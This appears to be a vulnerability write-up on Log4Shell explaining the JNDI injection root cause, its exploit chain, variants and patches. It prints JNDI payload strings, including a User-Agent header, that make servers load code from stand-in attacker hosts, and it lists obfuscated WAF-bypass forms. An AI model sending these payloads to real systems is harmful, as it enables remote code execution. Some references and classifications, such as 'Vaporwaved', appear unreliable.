# Log4Shell (CVE-2021-44228)

## Classification
- **CVE**: CVE-2021-44228 (original), CVE-2021-45046 (bypass), CVE-2021-45105 (DoS), CVE-2021-44832 (RCE variant)
- **CVSS 3.1**: 10.0 (Critical) — maximum possible score
- **Type**: JNDI Injection via Log4j — Unauthenticated Remote Code Execution
- **Affected**: Apache Log4j 2.0 → 2.14.1 (nearly every Java application)
- **Wild Impact**: ~50% of corporate networks, exploited within hours of disclosure

## Root Cause

Log4j supports **JNDI lookups** in log messages via `${jndi:ldap://attacker.com/a}` syntax. When a logged string contains `${...}`, Log4j recursively resolves it. An attacker who can control **any logged field** (User-Agent, HTTP headers, form data, username) can inject a JNDI lookup that triggers an LDAP connection to their server, which returns a serialized Java object that gets deserialized into arbitrary code.

```java
// Simplified from Log4j 2.x — PatternLayout / MessagePatternConverter
// When formatting a log message, Log4j calls StrSubstitutor.replace()
// which resolves all ${...} placeholders

public void format(LogEvent event, StringBuilder toAppendTo) {
    // For each logged message that matches a pattern
    String message = event.getMessage().getFormattedMessage();
    
    // THIS IS THE PROBLEM — recursive JNDI resolution
    String resolved = StrSubstitutor.replace(message);  // ${jndi:ldap://...}
    
    // JndiLookup.lookup("ldap://attacker.com/evil") is called
    // → connects to attacker LDAP server
    // → attacker returns Java class reference
    // → Log4j loads and deserializes it
    // → ARBITRARY CODE EXECUTION
}
```

**The lookup chain:**
```
${jndi:ldap://attacker.com/a}
  → JndiManager.lookup("ldap://attacker.com/a")
    → InitialContext.lookup("ldap://attacker.com/a")
      → TCP connect to attacker:1389
        → Attacker returns malicious Java object (Reference)
          → Java loads attacker's class from HTTP server
            → static initializer runs → RCE
```

## Exploit Chain

1. **Identify target**: Any Java app using Log4j 2.0-2.14.1 (Minecraft, iCloud, Steam, AWS, Cloudflare, VMWare...)
2. **Inject payload**: Send request with malicious header — `User-Agent: ${jndi:ldap://attacker.net/evil}`
3. **LDAP callback**: Attacker's LDAP server receives connection from victim server
4. **Reference response**: LDAP returns a `javax.naming.Reference` pointing to attacker's HTTP class server
5. **Class loading**: Victim Java app fetches and loads the remote class
6. **Code execution**: Class static initializer runs arbitrary code at app privilege level

## Why It Was a 10.0

- **Unprecedented reach**: Every Java app using Log4j — Minecraft, iCloud, Steam, AWS, Tesla, Cloudflare, literally millions of servers
- **Trivially exploitable**: Single HTTP header, no auth needed
- **Near-zero required skill**: Automated scanners and mass exploitation began within hours
- **No patching possible for many**: Hundreds of thousands of closed-source apps shipped with Log4j (including VMware, IBM, Cisco, etc.)

## Pattern Recognition

1. **Template engines with recursive resolution**: Any system that resolves `${}` / `{{}}` / `#{}` recursively could have equivalent bugs
2. **Message formatting as an attack surface**: Log messages "can't cause harm" is a fallacy — format strings, JNDI lookups, etc.
3. **JNDI injection class**: The real vulnerability class is "untrusted data reaching JNDI lookup" — affects Spring (Vaporwaved), Tomcat, etc.
4. **Dependency chain poisoning**: Log4j is a transitive dependency in >90% of Java projects — supply chain risk is extreme
5. **Protocol smuggling through data**: Attackers control "data" fields that become "code" via unexpected parser paths

## Variants
- **CVE-2021-45046**: Patch bypass — certain non-default patterns still allowed lookup
- **CVE-2021-45105**: DoS via infinite recursion on `${::-${::-...}}`
- **CVE-2021-44832**: RCE via attacker-controlled Log4j config file loading
- **Other JNDI injection**: Spring4Shell (CVE-2022-22965) used class injection via Spring framework

## Mitigation Status
- **Patch**: Log4j 2.15.0+ (disables JNDI lookups by default, limits protocols)
- **Final fix**: Log4j 2.17.0+ (removed JNDI entirely from message lookup, removed Message Lookups)
- **WAF bypasses**: Numerous WAF rules bypassed via encoding, nested lookups, `${${::-${::-...}}}` obfuscation
- **2026 status**: Shodan/Censys still scan and find thousands of internet-facing servers with Log4j vulnerable; tens of thousands of internal apps remain unpatched

## PoC & References
- **Original PoC**: github.com/christophetd/log4shell-vulnerable-app
- **Mass scanner**: github.com/fullhunt/log4j-scan
- **Payload generator**: github.com/pimps/gootloader (log4j payload creation)
- **Nuclei templates**: github.com/projectdiscovery/nuclei-templates (CVE-2021-44228 scanning)
- **Exploit-DB**: Multiple entries for different JNDI/LDAP exploit methods
- **CISA guidance**: cisa.gov/emergency-directives — ED 21-04 Log4j
- **Full technical analysis**: lunasec.com/docs/log4j (LunaSec writeup)
- **APT exploitation**: APTs actively exploited Log4j within 24 hours of disclosure (Minecraft servers used as test)
